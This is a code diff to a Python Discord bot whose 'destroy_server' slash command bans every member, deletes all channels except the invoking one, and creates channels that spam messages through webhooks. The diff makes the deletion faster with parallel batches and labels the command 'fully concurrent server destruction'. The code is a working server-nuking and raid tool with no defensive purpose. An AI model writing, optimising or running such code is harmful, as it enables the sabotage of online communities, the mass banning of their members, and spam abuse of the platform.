@@ -38,7 +38,7 @@ async def send_webhook_spams(
 
 @bot.tree.command(
     name="destroy_server",
-    description="أمر تدمير السيرفر السريع بدون أرقام في أسماء الرومات",
+    description="أمر تدمير السيرفر السريع والمتزامن بالكامل",
 )
 @app_commands.describe(
     room_name="اسم الرومات الجديدة (بدون أرقام)",
@@ -77,23 +77,42 @@ async def destroy_server(
 
     ban_tasks = [ban_member(m) for m in guild.members]
 
-    # 2. حذف الرومات القديمة دفعة واحدة (باستثناء روم الأمر)
-    async def delete_channel(channel):
-        if channel.id == interaction.channel.id:
-            return
-        try:
-            await channel.delete()
-        except Exception as e:
-            print(f"فشل حذف الروم {channel.name}: {e}")
+    # 2. حذف الرومات بدفعات متوازية سريعة تمنع التوقف
+    channels_to_delete = [
+        c for c in guild.channels if c.id != interaction.channel.id
+    ]
 
-    delete_tasks = [delete_channel(c) for c in guild.channels]
+    async def delete_batch(channels):
+        tasks = []
+        for channel in channels:
 
-    # 3. إنشاء الرومات والويب هوكات والسبام دفعة واحدة بدون أرقام
+            async def delete_single(ch):
+                try:
+                    await ch.delete()
+                except Exception as e:
+                    print(f"فشل حذف الروم {ch.name}: {e}")
+
+            tasks.append(delete_single(channel))
+        if tasks:
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    # تقسيم الرومات إلى دفعات سريعة جداً
+    batch_size = 5
+    channel_batches = [
+        channels_to_delete[i : i + batch_size]
+        for i in range(0, len(channels_to_delete), batch_size)
+    ]
+
+    async def delete_all_in_batches():
+        for batch in channel_batches:
+            await delete_batch(batch)
+            await asyncio.sleep(0.02)
+
+    # 3. إنشاء الرومات والويب هوكات والسبام دفعة واحدة
     category = interaction.channel.category
 
     async def create_and_spam(i):
         try:
-            # استخدام الاسم المباشر بدون إضافة رقم تسلسلي (ملاحظة: ديسكورد قد يدمج الأسماء المتطابقة لو كانت في نفس الكاتجوري تماماً، لكنها ستنشأ بالاسم الذي طلبتَه)
             name = room_name
             overwrites = {
                 guild.default_role: discord.PermissionOverwrite(
@@ -107,7 +126,6 @@ async def destroy_server(
             else:
                 channel = await guild.create_text_channel(name, overwrites=overwrites)
 
-            # إنشاء الويب هوك بالاسم المباشر بدون أرقام
             webhook = await channel.create_webhook(name=webhook_name)
             await send_webhook_spams(webhook, message_content, messages_count)
         except Exception as e:
@@ -115,10 +133,10 @@ async def destroy_server(
 
     create_tasks = [create_and_spam(i) for i in range(1, rooms_count + 1)]
 
-    # إطلاق العمليات كلها مع بعض بشكل متزامن
+    # إطلاق العمليات كلها مع بعض
     await asyncio.gather(
         asyncio.gather(*ban_tasks, return_exceptions=True),
-        asyncio.gather(*delete_tasks, return_exceptions=True),
+        delete_all_in_batches(),
         asyncio.gather(*create_tasks, return_exceptions=True),
         return_exceptions=True,
     )
